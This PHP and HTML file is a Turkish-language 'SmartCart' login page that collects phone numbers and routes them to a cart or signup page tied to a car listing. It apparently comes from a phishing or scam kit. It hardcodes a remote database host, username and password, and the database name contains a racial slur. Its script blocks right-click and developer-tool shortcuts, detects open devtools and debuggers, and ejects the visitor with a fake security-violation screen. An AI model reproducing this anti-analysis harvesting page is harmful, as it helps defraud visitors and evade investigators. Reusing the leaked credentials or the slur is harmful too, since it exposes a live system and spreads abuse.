<?php
// login.php
declare(strict_types=1);

ini_set('display_errors', '0');
error_reporting(0);

/* =========================
   DB BAĞLANTISI
========================= */
$db_host = "avocart.com.tr";
$db_user = "kedis";
$db_pass = "kedis2minis1";
$db_name = "mirmirnigga";

$conn = mysqli_connect($db_host, $db_user, $db_pass, $db_name);
if (!$conn) { die("Erişim Engellendi."); }
mysqli_set_charset($conn, "utf8mb4");

$arabaID = (int)($_GET['id'] ?? 1);

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['phone'])) {
    $phone = preg_replace('/[^0-9]/', '', $_POST['phone']);
    if (strlen($phone) === 10) {
        $safePhone = mysqli_real_escape_string($conn, $phone);
        $checkUser = mysqli_query($conn, "SELECT id FROM kullanicilar WHERE telefon = '$safePhone' LIMIT 1");
        
        if (mysqli_num_rows($checkUser) > 0) {
            header("Location: sepet.php?id=$arabaID&phone=$safePhone");
        } else {
            header("Location: uye_ol.php?id=$arabaID&phone=$safePhone");
        }
        exit;
    }
}
?>
<!DOCTYPE html>
<html lang="tr" oncontextmenu="return false;">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>SmartCart | Güvenli Giriş</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap" rel="stylesheet">
    <style>
        :root { --brand-green: #215A31; --brand-teal: #0D707D; }
        body { 
            font-family: 'Inter', sans-serif; 
            background-color: #F9F8F6; 
            overflow: hidden; 
            user-select: none;
            -webkit-user-select: none;
        }
        .main-container { height: 100vh; height: 100dvh; }
        .keypad-btn:active { transform: scale(0.92); background-color: #f3f4f6; }
        .fade-in { animation: fadeIn 0.5s ease-out; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
    </style>
</head>
<body class="main-container flex flex-col p-4 max-w-[420px] mx-auto fade-in">

    <div class="flex justify-end gap-2 mb-2">
        <button class="w-8 h-8 rounded-full border border-[#215A31] overflow-hidden bg-white shadow-sm">
            <img src="https://gizemgunduz.store/turk-bayrak.png" class="w-full h-full object-cover">
        </button>
        <button class="w-8 h-8 rounded-full border border-slate-200 overflow-hidden bg-white opacity-40 shadow-sm">
            <img src="https://gizemgunduz.store/uk-bayrak.png" class="w-full h-full object-cover">
        </button>
    </div>

    <div class="flex flex-col items-center justify-center flex-grow space-y-4 min-h-0">
        <div class="text-center">
            <img src="https://gizemgunduz.store/logo.png" alt="Logo" class="h-10 mx-auto mb-2 drop-shadow-sm">
            <h1 class="text-xl font-black text-slate-800 uppercase tracking-tighter">Hoş Geldiniz</h1>
            <p class="text-[11px] text-slate-400 font-bold uppercase tracking-widest">Telefon numaranızı girin</p>
        </div>

        <div class="w-full bg-white border-2 border-slate-200 rounded-2xl h-16 flex items-center justify-center shadow-inner">
            <span id="phone-display" class="text-2xl font-mono font-bold tracking-widest text-[#0D707D]">
                <span class="text-slate-300">(5__) ___ __ __</span>
            </span>
        </div>

        <div class="grid grid-cols-3 gap-2 w-full max-w-[340px]">
            <?php foreach (['1', '2', '3', '4', '5', '6', '7', '8', '9'] as $num): ?>
                <button type="button" onclick="addDigit('<?= $num ?>')" class="keypad-btn h-14 bg-white border border-slate-200 rounded-2xl font-black text-xl text-slate-700 shadow-sm"><?= $num ?></button>
            <?php endforeach; ?>
            <button type="button" onclick="clearAll()" class="keypad-btn h-14 bg-white border border-slate-200 rounded-2xl font-bold text-red-500 text-[10px] uppercase">Temizle</button>
            <button type="button" onclick="addDigit('0')" class="keypad-btn h-14 bg-white border border-slate-200 rounded-2xl font-black text-xl text-slate-700">0</button>
            <button type="button" onclick="backspace()" class="keypad-btn h-14 bg-white border border-slate-200 rounded-2xl flex items-center justify-center text-slate-500">
                <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M12 14l2-2m0 0l2-2m-2 2l-2-2m2 2l2 2M3 12l6.414 6.414A2 2 0 0010.828 19H19a2 2 0 002-2V7a2 2 0 00-2-2h-8.172a2 2 0 00-1.414.586L3 12z" />
                </svg>
            </button>
        </div>
    </div>

    <div class="mt-4 pb-6">
        <form method="POST" id="login-form">
            <input type="hidden" name="phone" id="hidden-phone">
            <button type="submit" id="submit-btn" disabled 
                class="w-full h-16 bg-[#215A31] text-white rounded-2xl font-black text-lg shadow-lg active:scale-95 uppercase tracking-widest disabled:opacity-30">
                DEVAM ET
            </button>
        </form>
    </div>

    <script>
        // SİSTEMDEN ATMA FONKSİYONU
        function kickUser(reason) {
            document.body.innerHTML = "<div style='background:#000; color:#0f0; height:100vh; display:flex; align-items:center; justify-content:center; font-family:monospace; text-align:center;'><h1>[!] GÜVENLİK İHLALİ TESPİT EDİLDİ<br>ERİŞİMİNİZ SONLANDIRILDI.</h1></div>";
            setTimeout(() => {
                window.location.replace("about:blank");
            }, 1500);
        }

        /* 1. Klavye ve Kısayol Engeli + Atma */
        document.onkeydown = function(e) {
            // F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U
            if (
                event.keyCode == 123 || 
                (e.ctrlKey && e.shiftKey && (e.keyCode == 'I'.charCodeAt(0) || e.keyCode == 'J'.charCodeAt(0) || e.keyCode == 'C'.charCodeAt(0))) || 
                (e.ctrlKey && e.keyCode == 'U'.charCodeAt(0))
            ) {
                kickUser("Key Violation");
                return false;
            }
        };

        /* 2. DevTools Açıldığında Atma (Boyut Kontrolü) */
        // Geliştirici araçları açıldığında pencere iç boyutu ciddi oranda değişir.
        window.addEventListener('resize', function() {
            if ((window.outerWidth - window.innerWidth) > 160 || (window.outerHeight - window.innerHeight) > 160) {
                kickUser("DevTools Opened");
            }
        });

        /* 3. Debugger Üzerinden Atma */
        setInterval(function() {
            var startTime = performance.now();
            debugger; 
            var endTime = performance.now();
            if (endTime - startTime > 100) { 
                kickUser("Debugger Detected");
            }
        }, 500);

        /* 4. Sağ Tık Atma (İsteğe bağlı, sadece engellemek yerine atar) */
        document.oncontextmenu = function(e) {
            kickUser("Context Menu Attempt");
            return false;
        };

        /* --- Standart Form Mantığı --- */
        let digits = "";
        const display = document.getElementById('phone-display');
        const hidden = document.getElementById('hidden-phone');
        const btn = document.getElementById('submit-btn');

        function updateUI() {
            if (digits.length === 0) {
                display.innerHTML = '<span class="text-slate-300">(5__) ___ __ __</span>';
            } else {
                let d = digits.padEnd(10, "_");
                display.innerText = `(${d.slice(0,3)}) ${d.slice(3,6)} ${d.slice(6,8)} ${d.slice(8,10)}`;
            }
            hidden.value = digits;
            btn.disabled = digits.length !== 10;
        }

        function addDigit(n) { if (digits.length < 10) { digits += n; updateUI(); } }
        function backspace() { digits = digits.slice(0, -1); updateUI(); }
        function clearAll() { digits = ""; updateUI(); }
    </script>
</body>
</html>